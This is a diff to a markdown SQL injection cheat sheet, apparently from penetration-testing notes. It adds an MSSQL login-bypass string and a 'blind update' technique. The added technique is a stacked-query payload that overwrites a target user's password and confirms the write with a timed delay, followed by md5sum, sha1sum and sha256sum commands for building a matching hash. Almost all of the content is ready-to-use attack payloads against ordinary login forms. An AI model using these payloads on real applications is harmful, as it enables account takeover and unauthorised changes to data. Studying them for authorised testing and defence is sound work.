@@ -1,15 +1,15 @@
 # SQL injection
 
-## Login bypass
+## Simple login bypass
 
-### MySQL
+#### MySQL
 
 ```
 ' or 1=1;#
 ' or 1=1 LIMIT 1;#
 ```
 
-### PostgreSQL
+#### PostgreSQL
 
 ```
 ' or 1=1;--
@@ -17,11 +17,39 @@
 ' or 1=1 LIMIT 1;--
 ```
 
-### Oracle
+#### Oracle
 
 ```
 ' or 1=1--
 ' or 1=1 LIMIT 1--
+```
+
+#### MSSQL
+
+```
+' or 1=1--
+```
+
+## Login bypass by blind update
+
+This technique requires you to know the table and column name of the password field. Once discovered we attempt to update the value of the password with an arbitrary one and then log in as the user. In case of stored password hashes we have to guess the correct hash format.
+
+#### Update and verify execution
+
+Execute an update statement and then verify its execution by running a select query on the new value. If the application hangs for the specified time then the update is successful and we have writing rights
+
+```
+'; update <table> set <col> = '<str>' where username = '<user>'; IF ((select count(*) from <table> where <col>='<str>')=1) WAITFOR DELAY '0:0:10';--
+```
+
+#### Convert string to hash
+
+If the db stores the passwords as hashes we have to guess the hash type. We can use the following commands to generate hash strings to use with the update statement
+
+```
+echo -n '<pass>' | md5sum
+echo -n '<pass>' | sha1sum
+echo -n '<pass>' | sha256sum
 ```
 
 ## Injection types
